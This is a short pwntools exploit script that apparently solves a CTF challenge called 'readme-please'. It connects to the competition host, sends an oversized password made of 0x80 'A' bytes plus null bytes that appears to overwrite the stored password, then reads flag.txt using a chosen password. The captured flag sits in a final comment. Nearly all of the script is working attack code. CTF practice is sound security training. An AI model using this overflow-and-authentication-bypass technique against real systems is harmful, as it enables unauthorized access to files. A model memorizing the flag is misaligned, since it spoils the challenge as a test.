from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# p = gdb.debug('./main', '''
#               b *main+358
#               continue
# ''')

p = remote('readme-please.ctf.pearlctf.in', 30039)

p.sendlineafter(b'Enter the file name: ', b'files/flag.txt')
p.recvuntil(b'Enter password: ')
p.sendline(b'A'*0x80+b'\0'*0x10)

p.sendlineafter(b'Enter the file name: ', b'files/flag.txt')
p.recvuntil(b'Enter password: ')
p.sendline(b'A'*0x10)

p.interactive()

# pearl{f1l3_d3script0rs_4r3_c00l}